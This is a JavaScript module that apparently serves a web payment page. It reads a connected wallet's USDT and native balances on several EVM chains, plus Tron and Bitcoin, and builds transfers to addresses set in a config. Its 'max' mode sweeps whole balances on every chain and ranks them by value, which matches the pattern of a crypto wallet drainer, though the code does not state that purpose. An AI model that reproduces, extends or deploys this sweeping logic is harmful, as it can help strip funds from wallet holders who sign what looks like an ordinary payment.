import { EVM } from './chains';
import { postJson } from './api';

const pad = (value) => String(value).replace(/^0x/, '').toLowerCase().padStart(64, '0');
const units = (value, decimals) => {
  const [whole = '0', fraction = ''] = String(value).split('.');
  return BigInt(`${whole}${fraction.padEnd(decimals, '0').slice(0, decimals)}`);
};
async function rpc(url, method, params) {
  const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }) });
  const data = await response.json();
  if (data.error) throw new Error(data.error.message);
  return data.result;
}
async function prices(chains) {
  const ids = [...new Set(chains.map((chain) => EVM[chain]?.priceId).filter(Boolean))];
  if (!ids.length) return {};
  let data = {};
  try {
    const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd`);
    if (response.ok) data = await response.json();
  } catch (_) {}
  const values = Object.fromEntries(ids.map((id) => [id, Number(data[id]?.usd || 0)]));
  const symbols = { ethereum: 'ETH', binancecoin: 'BNB', 'polygon-ecosystem-token': 'POL' };
  const missing = ids.filter((id) => !values[id] && symbols[id]);
  if (missing.length) {
    try {
      const response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=${missing.map((id) => symbols[id]).join(',')}&tsyms=USD`);
      if (response.ok) {
        const fallback = await response.json();
        missing.forEach((id) => { values[id] = Number(fallback[symbols[id]]?.USD || 0); });
      }
    } catch (_) {}
  }
  return values;
}
async function evmTransfers(connection, config) {
  const chains = config.enabledAssets.filter((chain) => EVM[chain]);
  const priceMap = await prices(chains).catch(() => ({}));
  const groups = await Promise.all(chains.map(async (chain) => {
    try {
      const cfg = EVM[chain];
      const account = connection.accounts.find((value) => value.startsWith(`${cfg.caip}:`));
      const from = account?.split(':').pop();
      if (!from) return [];
      const [tokenHex, nativeHex, gasHex] = await Promise.all([
        rpc(cfg.rpc, 'eth_call', [{ to: cfg.token, data: `0x70a08231${pad(from)}` }, 'latest']), rpc(cfg.rpc, 'eth_getBalance', [from, 'latest']), rpc(cfg.rpc, 'eth_gasPrice', []),
      ]);
    const items = [];
    const tokenBalance = BigInt(tokenHex || 0); const whole = 10n ** BigInt(cfg.decimals);
    const tokenAmount = config.amountMode === 'max' ? (tokenBalance / whole) * whole : units(config.amountUsd, cfg.decimals);
    if (tokenAmount > 0n && tokenBalance >= tokenAmount) items.push({ chain, chainId: cfg.caip, symbol: 'USDT', amount: Number(tokenAmount) / 10 ** cfg.decimals, availableUsd: Number(tokenBalance) / 10 ** cfg.decimals, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: cfg.token, value: '0x0', data: `0xa9059cbb${pad(config.evmAddress)}${pad(tokenAmount.toString(16))}` }] } });
    const nativeBalance = BigInt(nativeHex || 0); const spendable = nativeBalance > BigInt(gasHex || 0) * 25000n ? nativeBalance - BigInt(gasHex || 0) * 25000n : 0n;
    const price = priceMap[cfg.priceId] || 0; const fixed = price ? units((config.amountUsd / price).toFixed(18), 18) : 0n;
    const nativeAmount = config.amountMode === 'max' ? (spendable / 10n ** 18n) * 10n ** 18n : fixed;
      if (nativeAmount > 0n && spendable >= nativeAmount) items.push({ chain, chainId: cfg.caip, symbol: cfg.native, amount: Number(nativeAmount) / 1e18, availableUsd: Number(spendable) / 1e18 * price, to: config.evmAddress, request: { method: 'eth_sendTransaction', params: [{ from, to: config.evmAddress, value: `0x${nativeAmount.toString(16)}`, data: '0x', gas: '0x5208' }] } });
      return items;
    } catch (_) {
      return [];
    }
  }));
  return groups.flat();
}
export async function prepareTransfers(connection, config) {
  const items = await evmTransfers(connection, config);
  if (config.enabledAssets.includes('tron') && connection.tronAddress && config.tronAddress) {
    const prepared = await postJson('/api/tron/prepare', { from: connection.tronAddress, amountUsd: config.amountUsd, card: config.card });
    if (prepared?.amount > 0 && prepared?.transaction) items.push({ chain: 'tron', chainId: 'tron:0x2b6653dc', symbol: 'USDT', amount: prepared.amount, availableUsd: prepared.availableUsd, amountUsd: config.amountUsd, card: config.card, to: config.tronAddress, transaction: prepared.transaction, tron: true });
  }
  if (config.enabledAssets.includes('bitcoin') && connection.bitcoinAddress && config.btcAddress) {
    const preview = await postJson('/api/bitcoin/preview', { address: connection.bitcoinAddress, amountUsd: config.amountUsd, card: config.card }).catch(() => null);
    if (preview?.satoshis) items.push({ chain: 'bitcoin', chainId: 'bip122:000000000019d6689c085ae165831e93', symbol: 'BTC', amount: preview.amount, availableUsd: preview.availableUsd, amountUsd: config.amountUsd, card: config.card, satoshis: preview.satoshis, to: config.btcAddress, bitcoin: true });
  }
  return items.sort((a, b) => Number(b.availableUsd || 0) - Number(a.availableUsd || 0));
}